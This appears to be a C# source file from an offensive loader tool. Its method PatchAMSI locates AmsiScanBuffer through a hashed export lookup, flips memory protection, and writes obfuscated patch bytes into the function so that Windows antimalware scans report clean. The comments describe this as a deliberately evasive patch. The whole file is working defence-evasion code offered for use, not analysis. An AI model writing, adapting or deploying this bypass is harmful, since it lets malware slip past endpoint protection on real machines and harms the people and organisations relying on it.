using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MfRunner
{
    internal partial class Program
    {
        public static void PatchAMSI()
        {
            // Get the address of AmsiScanBuffer
            IntPtr AmsiScanBufferAddress = GetExportAddress(AmsiAddress, 0xDE7FB4D9);
            if (AmsiScanBufferAddress == IntPtr.Zero)
                return;

            // Calculate the target address (AmsiScanBuffer + 33 bytes)
            // This targets a specific instruction within the function for a more evasive patch
            long targetOffset = (long)AmsiScanBufferAddress + 33;
            IntPtr targetAddress = (IntPtr)targetOffset;

            // Patch bytes: 72 49 219 = "xor rbx, rbx" in x64
            // This causes the function to return AMSI_RESULT_CLEAN
            byte[] AmsiPatchBytes = new byte[] { 72, 49, 219 };
            ApplyRC4(AmsiPatchBytes, DeriveKey(SEED_AMSI_PATCH));
            
            uint OldProtect = 0;
            // Change memory protection to PAGE_EXECUTE_READWRITE (0x40)
            if (CustomVirtualProtect(targetAddress, (UIntPtr)AmsiPatchBytes.Length, 0x40, out OldProtect))
            {
                // Apply the patch
                CopyFunction(targetAddress, AmsiPatchBytes);
                
                // Restore memory protection to PAGE_EXECUTE_READ (0x20)
                uint temp = 0;
                CustomVirtualProtect(targetAddress, (UIntPtr)AmsiPatchBytes.Length, 0x20, out temp);
            }
        }
    }
}
